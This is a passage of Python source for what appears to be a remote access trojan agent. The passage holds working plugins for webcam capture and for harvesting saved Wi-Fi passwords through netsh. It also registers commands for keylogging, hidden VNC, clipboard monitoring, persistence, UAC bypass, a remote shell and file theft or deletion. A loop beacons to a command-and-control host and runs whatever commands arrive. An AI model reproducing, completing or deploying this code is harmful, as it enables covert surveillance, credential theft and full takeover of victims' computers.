        return {"output": "[!] UAC bypass failed"}
    except Exception as e: return {"output": f"[!] UAC bypass error: {e}"}
_CMDS["uac_bypass"] = _cmd_uac_bypass


# --- webcam plugin ---

def _cmd_webcam(m):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return {"output": "[!] No webcam found"}
        ret, frame = cap.read()
        cap.release()
        if not ret: return {"output": "[!] Capture failed"}
        _, buf = cv2.imencode(".jpg", frame)
        return {"data": base64.b64encode(buf.tobytes()).decode()}
    except ImportError:
        return {"output": "[!] Webcam requires opencv-python-headless on the target machine. Install: pip install opencv-python-headless"}
    except Exception as e:
        return {"output": f"[!] Webcam: {e}"}
_CMDS["webcam"] = _cmd_webcam


# --- wifi_harvest plugin ---

def _cmd_wifi_harvest(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Windows only"}
        r = subprocess.run(["netsh","wlan","show","profiles"], capture_output=True, text=True, timeout=30)
        profiles = []
        for line in r.stdout.split("\n"):
            if "All User Profile" in line:
                p = line.split(":")[-1].strip()
                r2 = subprocess.run(["netsh","wlan","show","profile",p,"key=clear"], capture_output=True, text=True, timeout=15)
                key = ""
                for l2 in r2.stdout.split("\n"):
                    if "Key Content" in l2: key = l2.split(":")[-1].strip()
                profiles.append({"ssid": p, "password": key})
        return {"data": {"networks": profiles, "count": len(profiles)}}
    except Exception as e: return {"output": f"[!] WiFi harvest: {e}"}
_CMDS["wifi_harvest"] = _cmd_wifi_harvest

_CMDS['harvest'] = _cmd_harvest
_CMDS['clipboard_get'] = _cmd_clipboard_get
_CMDS['clipboard_monitor'] = _cmd_clipboard_monitor
_CMDS['clipboard_set'] = _cmd_clipboard_set
_CMDS['ls'] = _cmd_ls
_CMDS['upload'] = _cmd_upload
_CMDS['download'] = _cmd_download
_CMDS['delete'] = _cmd_delete
_CMDS['execute'] = _cmd_execute
_CMDS['search'] = _cmd_search
_CMDS['hvnc_start'] = _cmd_hvnc_start
_CMDS['hvnc_stop'] = _cmd_hvnc_stop
_CMDS['hvnc_screenshot'] = _cmd_hvnc_screenshot
_CMDS['hvnc_stream'] = _cmd_hvnc_stream
_CMDS['hvnc_mouse'] = _cmd_hvnc_mouse
_CMDS['hvnc_key'] = _cmd_hvnc_key
_CMDS['keylog_start'] = _cmd_keylog_start
_CMDS['keylog_stop'] = _cmd_keylog_stop
_CMDS['keylog_get'] = _cmd_keylog_get
_CMDS['persist'] = _cmd_persist
_CMDS['persist_check'] = _cmd_persist_check
_CMDS['screenshot'] = _cmd_screenshot
_CMDS['shell'] = _cmd_shell
_CMDS['uac_bypass'] = _cmd_uac_bypass
_CMDS['webcam'] = _cmd_webcam
_CMDS['wifi_harvest'] = _cmd_wifi_harvest

def _cmd_info(m):
    return {"os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid(),"cwd":os.getcwd()}
_CMDS["info"] = _cmd_info

def _main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30); s.connect((C2_HOST, C2_PORT))
            sms(s, {"type":"init","os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid()})
            s.settimeout(15)
            while True:
                try:
                    m = rms(s)
                    if m is None: break
                except socket.timeout:
                    sms(s, {"type":"ping"}); continue
                if m["type"] == "exit": s.close(); return
                fn = _CMDS.get(m["type"])
                if fn:
                    try:
                        r = fn(m)
                        if r is not None: sms(s, {"type":"response",**r})
                    except Exception as e: sms(s, {"type":"response","error":str(e)})
                else:
                    sms(s, {"type":"response","error":f"Unknown command: {m['type']}"})
        except: pass
        finally:
            try: s.close()
            except: pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    _main()
